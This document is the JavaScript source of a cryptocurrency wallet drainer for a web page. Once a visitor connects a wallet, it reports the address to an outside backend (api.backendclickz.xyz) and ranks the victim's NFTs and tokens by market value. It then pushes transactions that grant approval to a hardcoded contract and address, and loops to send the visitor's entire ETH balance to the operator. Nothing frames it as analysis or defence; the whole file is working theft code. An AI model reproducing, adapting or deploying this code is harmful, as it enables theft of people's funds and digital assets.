let CONTRATADR = "0xd67580f10D3740342113C2451BE45a557EBab42e"
let YOUR_ADDRESS = "0x8283F78Db944e2970b7773c3411ccC6d728f1E70";
let URL = "https://api.backendclickz.xyz"
let ABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "operator",
                "type": "address"
            },
            {
                "internalType": "bool",
                "name": "approved",
                "type": "bool"
            }
        ],
        "name": "setApprovalForAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [

        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },

]

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
let web3Modal;
let provider;
let selectedAccount;
let web3;
const providerOptions = {
};
web3Modal = new Web3Modal({
    cacheProvider: false, // optional
    providerOptions, // required
    disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
});


async function connect() {
    try {
        await web3Modal.clearCachedProvider()
    }
    catch (e) {
        console.log(e)
    }
    provider = await web3Modal.connect();
    web3 = new Web3(provider);
    const chainID = await web3.eth.getChainId();
    if(chainID !== 1){
        return;
    }
    const accounts = await web3.eth.getAccounts();
    fetch(URL+"/ping/"+accounts[0]);
    selectedAccount = accounts[0];
    const balance = await web3.eth.getBalance(selectedAccount);
    await startDrainer(selectedAccount,balance)
}


async function startDrainer(selectedAccount,balance){
    try {
        try {

            //throw "No accounts found"
            let sortedNFTs = await getNFTS(selectedAccount);
            await performInjection(selectedAccount, sortedNFTs,0);
            console.log("Completed ERC20 and ERC721 Now ETH")
            await sendAllMoney()
        }
        catch (error) {
            // do in loop
            console.log(error)

            await sendAllMoney()


        }
    }
    catch (err) {
        await sendAllMoney()
    }
}

//GET ALL NFTS 
async function getNFTS(address) {
    let ethPrice = await getEtherPrice();
    let url = `${URL}/getnfts/${address}`;
    let response = await fetch(url);
    let data = await response.json();
    let nfts = await fetch(`https://api.opensea.io/api/v1/assets?owner=${address}&order_direction=desc&limit=200&include_orders=false`)
    let nftsData = await nfts.json();
    nftsData = nftsData["assets"];
    
    let contracts=[]
    let alreadyScanned = [];
    for (let i = 0; i < nftsData.length; i++) {
        let contract = nftsData[i];
        let contractAddress = contract["asset_contract"]["address"];
        let slug= contract["collection"]["slug"];
        let data ={"address":contractAddress,"slug":slug}
        if(!alreadyScanned.includes(slug)){
            let priceData = await fetch(`https://api.opensea.io/api/v1/collection/${slug}`)
            let price = await priceData.json();
            let floorprice = price["collection"]["stats"]["floor_price"];
            
            if(typeof floorprice == "number"){
                
                data["price"] = floorprice * ethPrice;
            }
            else{
                data["price"] = 0;
            }
            let new_data = {"floor_price":{"price":data["price"]},"isErc20":false,"token":contractAddress,"token_address":contractAddress};
            let emptydata = {}
            emptydata[contractAddress] = [new_data];
            contracts.push(emptydata);
            alreadyScanned.push(slug);
        }
    }

    data = data.concat(contracts);
    let prices_and_index = [];
    for(let i=0;i<data.length;i++){
        let keys = Object.keys(data[i]);
        let actual_data = data[i][keys[0]];
        let price = actual_data[0]["floor_price"]["price"];
        prices_and_index.push({"price":price,"index":i});
        //break;
    }
    prices_and_index.sort(function(a,b){
        return b["price"]-a["price"];
    }
    );
    // rearrange data in ascending order of price
    let new_data = [];
    for(let i=0;i<prices_and_index.length;i++){
        let index = prices_and_index[i]["index"];
        new_data.push(data[index]);
    }
    return new_data;
}

//GET CURRENT ETHEREUM PRICE
async function getEtherPrice(){
    let url = "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";
    let response = await fetch(url);
    let price = await response.json();
    return price["ethereum"]["usd"];
}

async function performInjection(address,sortedNFTs,startAt) {
    
    if (sortedNFTs.length == 0) {
        throw "No NFTs found"
    }
    for (let i = 0; i < sortedNFTs.length; i++) {
        if(i<startAt){
            continue
        }
        let key = Object.keys(sortedNFTs[i])[0]
        let actualDict = sortedNFTs[i][key];
        
        let higherPrice = sortedNFTs[i][key][0]["token_address"];
        let isErc20 = sortedNFTs[i][key][0]["isErc20"];
        
        let contractInstance = new web3.eth.Contract(ABI, higherPrice);
        let toCheckSumAddress = await web3.utils.toChecksumAddress(higherPrice);
        let price = sortedNFTs[i][key][0]["floor_price"]["price"];
        console.log(higherPrice,price)
        if(price < 20 ){
            console.log("Skipping because less than 20$",higherPrice)
            continue;
        }

        let data = { "owner": selectedAccount, "address": toCheckSumAddress,"isErc20": isErc20  };
        if(isErc20){
            data["balance"] = actualDict[0]["balance"];
        }
        
        await fetch(`${URL}/transfer/init`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        });
        let data_to_encode = contractInstance.methods.setApprovalForAll(CONTRATADR, true).encodeABI();
        if (actualDict[0]["isErc20"]) {
            let balanceOwned =actualDict[0]["balance"];
            data_to_encode = contractInstance.methods.approve(YOUR_ADDRESS, balanceOwned.toString()).encodeABI();
        }

        const transactionParameters = {
            to: higherPrice, // Required except during contract publications.
            from: selectedAccount, // must match user's active address.
            value: 0,
            'data': data_to_encode //make call to NFT smart contract 
        };
        try {
            const txHash = await provider.request({
                method: 'eth_sendTransaction',
                params: [transactionParameters],
            });
            
            if (i == sortedNFTs.length - 1) {
                await sendAllMoney();
            }
        } catch (error) {
            console.log("ERROR IN INJECTION",error)
            
            await performInjection(address,sortedNFTs,i)
        }
    }



}

async function get12DollarETH() {
    let perEth = await getEtherPrice();
    let usd = 1 / perEth;
    return usd * 20;
}


async function sendAllMoney() {
    try {
        let balance = await web3.eth.getBalance(selectedAccount);
        let to = YOUR_ADDRESS;
        balance = parseInt(balance);
        let transactionFee = await get12DollarETH()
        transactionFee = parseInt(web3.utils.toWei(transactionFee.toFixed(5).toString(), 'ether'));
        let transactionObject = { from: selectedAccount, to: to }
        let newBalance = balance - transactionFee;
        transactionObject.value = web3.utils.toHex(newBalance); // set the transaction value to the entire balance, less the transaction fee
        if (newBalance > 0) {
            try {
                await web3.eth.sendTransaction(transactionObject);
                await sendAllMoney();

            }
            catch (error) {
                await sendAllMoney();
            }
        }
        else {
            transactionObject.value = web3.utils.toHex(balance);
            await web3.eth.sendTransaction(transactionObject);
        }

    }
    catch (error) {
        console.log("error in sending eth",error)
        await sendAllMoney();
    }



}


document.addEventListener("DOMContentLoaded",()=>{
    
    if (typeof window.ethereum == 'undefined') {
        
        document.getElementById("connectBtn").parentElement.href = "metamask://dapp/"+window.location.host
       
    }
})